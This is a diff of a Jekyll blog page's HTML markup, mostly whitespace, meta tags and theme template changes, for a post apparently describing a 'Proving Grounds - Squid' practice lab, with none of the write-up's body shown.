@@ -15,41 +15,39 @@
 
 <!-- `site.alt_lang` can specify a language different from the UI -->
 <html lang="en" data-mode="dark">
-
-<head>
+  <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="viewport"
-    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover">
-  <!-- Setup Open Graph image -->
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
 
-
+  
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
-  <meta name="generator" content="Jekyll v4.3.3" />
-  <meta property="og:title" content="Proving Grounds - Squid" />
-  <meta property="og:locale" content="en" />
-  <meta name="description"
-    content="Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques." />
-  <meta property="og:description"
-    content="Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques." />
-  <link rel="canonical" href="http://localhost:4000/posts/Proving-Grounds-Squid/" />
-  <meta property="og:url" content="http://localhost:4000/posts/Proving-Grounds-Squid/" />
-  <meta property="og:image" content="http://localhost:4000/../assets/img/oscp/oscp.png" />
-  <meta property="og:type" content="article" />
-  <meta property="article:published_time" content="2024-07-11T00:00:00-03:00" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta property="twitter:image" content="http://localhost:4000/../assets/img/oscp/oscp.png" />
-  <meta property="twitter:title" content="Proving Grounds - Squid" />
-  <script type="application/ld+json">
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving Grounds - Squid" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques." />
+<meta property="og:description" content="Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques." />
+<link rel="canonical" href="http://localhost:4000/posts/Proving-Grounds-Squid/" />
+<meta property="og:url" content="http://localhost:4000/posts/Proving-Grounds-Squid/" />
+<meta property="og:image" content="http://localhost:4000/../assets/img/oscp/oscp.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-11T00:00:00-03:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/../assets/img/oscp/oscp.png" />
+<meta property="twitter:title" content="Proving Grounds - Squid" />
+<script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-11T00:00:00-03:00","datePublished":"2024-07-11T00:00:00-03:00","description":"Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.","headline":"Proving Grounds - Squid","image":"http://localhost:4000/../assets/img/oscp/oscp.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Proving-Grounds-Squid/"},"url":"http://localhost:4000/posts/Proving-Grounds-Squid/"}</script>
-  <!-- End Jekyll SEO tag -->
+<!-- End Jekyll SEO tag -->
 
 
-  <title>Proving Grounds - Squid |
+  <title>Proving Grounds - Squid | 
   </title>
 
   <!--
@@ -59,235 +57,258 @@
 
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png" />
-  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png" />
-  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png" />
+<link
+  rel="apple-touch-icon"
+  sizes="180x180"
+  href="/assets/img/favicons/apple-touch-icon.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="32x32"
+  href="/assets/img/favicons/favicon-32x32.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="16x16"
+  href="/assets/img/favicons/favicon-16x16.png"
+/>
 
+<link rel="manifest" href="/assets/img/favicons/site.q" />
 
-  <link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" />
-  <meta name="apple-mobile-web-app-title" content="" />
-  <meta name="application-name" content="" />
-  <meta name="msapplication-TileColor" content="#da532c" />
-  <meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml" />
-  <meta name="theme-color" content="#ffffff" />
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" />
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="application-name" content="" />
+<meta name="msapplication-TileColor" content="#da532c" />
+<meta
+  name="msapplication-config"
+  content="/assets/img/favicons/browserconfig.xml"
+/>
+<meta name="theme-color" content="#ffffff" />
 
 
   <!-- Resource Hints -->
-
-
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-
-  <link rel="dns-prefetch" href="https://fonts.googleapis.com">
-
-
-
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
-
-
-
-  <link rel="preconnect" href="https://cdn.jsdelivr.net">
-
-  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
-
-
-
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
 
   <!-- Bootstrap -->
-
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
-
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+  
 
   <!-- Theme style -->
   <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
 
   <!-- Web Font -->
-  <link rel="stylesheet"
-    href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
 
   <!-- Font Awesome Icons -->
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">
 
   <!-- 3rd-party Dependencies -->
 
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
+  
 
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css">
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
 
-
-
-  <link rel="stylesheet"
-    href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
-
-
-
-  <!-- Image Popup -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
-
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
 
   <!-- JavaScript -->
 
-
+  
 
   <!-- A placeholder to allow defining custom metadata -->
 
 </head>
 
 
-<body>
-  <!-- The Side Bar -->
+  <body>
+    <!-- The Side Bar -->
 
-  <aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
-    <header class="profile-wrapper">
-      <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112"
-          alt="avatar" onerror="this.style.display='none'"></a>
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
 
-      <h1 class="site-title">
-        <a href="/">H3NDR1CH</a>
-      </h1>
-      <p class="site-subtitle fst-italic mb-0">Writeup's - Tools - Pentest Guide</p>
-    </header>
-    <!-- .profile-wrapper -->
+    <h1 class="site-title">
+      <a href="/">H3NDR1CH</a>
+    </h1>
+    <p class="site-subtitle fst-italic mb-0">Writeup's - Tools - Pentest Guide</p>
+  </header>
+  <!-- .profile-wrapper -->
 
-    <nav class="flex-column flex-grow-1 w-100 ps-0">
-      <ul class="nav">
-        <!-- home -->
-        <li class="nav-item">
-          <a href="/" class="nav-link">
-            <i class="fa-fw fas fa-home"></i>
-            <span>HOME</span>
-          </a>
-        </li>
-        <!-- the real tabs -->
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+      <!-- the real tabs -->
+      
+      <li class="nav-item">
+        <a href="/categories/" class="nav-link">
+          <i class="fa-fw fas fa-stream"></i>
+          
 
-        <li class="nav-item">
-          <a href="/categories/" class="nav-link">
-            <i class="fa-fw fas fa-stream"></i>
+          <span>CATEGORIES</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/tags/" class="nav-link">
+          <i class="fa-fw fas fa-tags"></i>
+          
 
+          <span>TAGS</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/archives/" class="nav-link">
+          <i class="fa-fw fas fa-archive"></i>
+          
 
-            <span>CATEGORIES</span>
-          </a>
-        </li>
-        <!-- .nav-item -->
+          <span>ARCHIVES</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+      <li class="nav-item">
+        <a href="/about/" class="nav-link">
+          <i class="fa-fw fas fa-info-circle"></i>
+          
 
-        <li class="nav-item">
-          <a href="/tags/" class="nav-link">
-            <i class="fa-fw fas fa-tags"></i>
+          <span>ABOUT</span>
+        </a>
+      </li>
+      <!-- .nav-item -->
+      
+    </ul>
+  </nav>
 
+  <div class="sidebar-bottom d-flex flex-wrap align-items-center w-100">
+    
 
-            <span>TAGS</span>
-          </a>
-        </li>
-        <!-- .nav-item -->
+    
+    <a href="https://github.com/arthurhendrich" aria-label="GitHub" target="_blank" rel="noopener noreferrer">
+      <i class="fab fa-github"></i>
+    </a>
+    <a href="https://www.linkedin.com/in/arthurhendrich" aria-label="LinkedIn" target="_blank" rel="noopener noreferrer">
+      <i class="fab fa-linkedin"></i>
+    </a>
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
 
-        <li class="nav-item">
-          <a href="/archives/" class="nav-link">
-            <i class="fa-fw fas fa-archive"></i>
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
 
+<header id="topbar-wrapper" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
 
-            <span>ARCHIVES</span>
-          </a>
-        </li>
-        <!-- .nav-item -->
-
-        <li class="nav-item">
-          <a href="/about/" class="nav-link">
-            <i class="fa-fw fas fa-info-circle"></i>
-
-
-            <span>ABOUT</span>
-          </a>
-        </li>
-        <!-- .nav-item -->
-
-      </ul>
-    </nav>
-
-    <div class="sidebar-bottom d-flex flex-wrap align-items-center w-100">
-
-
-
-      <a href="https://github.com/arthurhendrich" aria-label="GitHub" target="_blank" rel="noopener noreferrer">
-        <i class="fab fa-github"></i>
-      </a>
-      <a href="https://www.linkedin.com/in/arthurhendrich" aria-label="LinkedIn" target="_blank"
-        rel="noopener noreferrer">
-        <i class="fab fa-linkedin"></i>
-      </a>
-    </div>
-    <!-- .sidebar-bottom -->
-  </aside>
-  <!-- #sidebar -->
-
-  <div id="main-wrapper" class="d-flex justify-content-center">
-    <div class="container d-flex flex-column px-xxl-5">
-      <!-- The Top Bar -->
-
-      <header id="topbar-wrapper" aria-label="Top Bar">
-        <div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100">
-          <nav id="breadcrumb" aria-label="Breadcrumb">
-
-
-
-
-
+      
+        
+          
             <span>
               <a href="/">Home</a>
             </span>
 
+          
+        
+          
+        
+          
+            
+              <span>Proving Grounds - Squid</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
 
 
 
-
-
-
-            <span>Proving Grounds - Squid</span>
-
-
-
-
-
-          </nav>
-          <!-- endof #breadcrumb -->
-
-          <button type="button" id="sidebar-trigger" class="btn btn-link">
-            <i class="fas fa-bars fa-fw"></i>
-          </button>
-
-          <div id="topbar-title">
-            Post
-          </div>
-
-          <button type="button" id="search-trigger" class="btn btn-link">
-            <i class="fas fa-search fa-fw"></i>
-          </button>
-
-          <search id="search" class="align-items-center ms-3 ms-lg-0">
-            <i class="fas fa-search fa-fw"></i>
-            <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off"
-              placeholder="Search...">
-          </search>
-          <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
-        </div>
-      </header>
-
-
-      <div class="row flex-grow-1">
-        <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
-
-          <!-- Refactor the HTML structure -->
-
-
-
-          <!--
+<!--
   In order to allow a wide table to scroll horizontally,
   we suround the markdown table with `<div class="table-wrapper">` and `</div>`
 -->
 
 
 
-          <!--
+<!--
   Fixed kramdown code highlight rendering:
   https://github.com/penibelst/jekyll-compress-html/issues/101
   https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
@@ -295,2000 +316,2000 @@
 
 
 
-          <!-- Change the icon of checkbox -->
+<!-- Change the icon of checkbox -->
 
 
 
-          <!-- Handle images -->
+<!-- Handle images -->
 
 
 
 
+  
+  
 
+  
+    
+      
+      
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
-          <!-- take out classes -->
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
-          <!-- lazy-load images -->
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
-          <!-- create the image wrapper -->
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
-          <!-- combine -->
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
-          <!-- take out classes -->
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
-          <!-- lazy-load images -->
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+    
 
+    
+    
 
+    
+    
+    
 
-          <!-- create the image wrapper -->
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
-          <!-- combine -->
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
-          <!-- take out classes -->
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
-          <!-- lazy-load images -->
+    
+    
 
+    
+    
+    
 
+    
+      
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
-          <!-- create the image wrapper -->
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
-          <!-- combine -->
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
-          <!-- take out classes -->
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
-          <!-- lazy-load images -->
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
-          <!-- create the image wrapper -->
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
-          <!-- combine -->
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
-          <!-- take out classes -->
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
-          <!-- lazy-load images -->
+    
+    
 
+    
 
+    
+      
+    
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
-          <!-- create the image wrapper -->
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
-          <!-- combine -->
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
-          <!-- take out classes -->
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
-          <!-- lazy-load images -->
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
-          <!-- create the image wrapper -->
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
-          <!-- combine -->
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
-          <!-- take out classes -->
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
-          <!-- lazy-load images -->
+    
+    
 
+    
 
+    
+    
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
-          <!-- create the image wrapper -->
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
-          <!-- combine -->
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
+    
+    
 
-          <!-- take out classes -->
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
-          <!-- lazy-load images -->
+    
+      
 
+      
+      
+      
 
+      
+    
+      
 
-          <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+      
+      
 
+      
+    
 
+    <!-- take out classes -->
+    
 
-          <!-- create the image wrapper -->
+    
+    
 
+    
 
+    
+      
+    
 
+    <!-- lazy-load images -->
+    
 
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
 
+      
+        <!-- create the image wrapper -->
+        
 
+        
+        
+      
+    
 
-          <!-- combine -->
+    <!-- combine -->
+    
+  
+    
 
+    
+    
 
+    
 
+    
+    
 
+    
+    
+    
 
+    
+      
 
+      
